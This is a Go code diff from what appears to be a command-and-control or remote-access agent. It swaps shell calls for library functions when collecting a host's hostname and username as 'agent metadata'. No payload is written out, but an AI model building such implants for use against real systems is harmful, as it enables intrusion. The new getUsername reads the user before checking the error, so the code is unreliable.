@@ -12,12 +12,14 @@ import (
 	"math/rand"
 	"net"
 	"os/exec"
+	"os/user"
 	"runtime"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
+	fqdn "github.com/Showmax/go-fqdn"
 	"github.com/armon/go-socks5"
 	"github.com/google/uuid"
 	"github.com/quic-go/quic-go"
@@ -93,21 +95,36 @@ func GenerateAgentMetadata() (string, string, string) {
 	var hostname string
 	var username string
 
-	if runtime.GOOS == "windows" {
-		hostname = strings.TrimSpace(RunShellCommand("hostname"))
-	} else {
-		hostname = strings.TrimSpace(RunShellCommand("hostname -f"))
+	hostname, err := getHostname()
+	if err != nil {
+		logger.Logf(logger.Error, "Error generating agent metadata: %v", err)
 	}
-	username = strings.TrimSpace(RunShellCommand("whoami"))
 
-	if hostname == "" {
-		hostname = "unknown-host"
-	}
-	if username == "" {
-		username = "unknown-user"
+	username, err = getUsername()
+	if err != nil {
+		logger.Logf(logger.Error, "Error generating agent metadata: %v", err)
 	}
 
 	return agentID, hostname, username
+}
+
+func getHostname() (string, error) {
+	hostname, err := fqdn.FqdnHostname()
+	if err != nil {
+		logger.Logf(logger.Error, "Error fetching hostname: %v", err)
+		return "unknown", err
+	}
+	return hostname, nil
+}
+
+func getUsername() (string, error) {
+	user, err := user.Current()
+	username := user.Username
+	if err != nil {
+		logger.Logf(logger.Error, "Error fetching username: %v", err)
+		return "unknown", err
+	}
+	return username, nil
 }
 
 func RunShellCommand(command string) string {
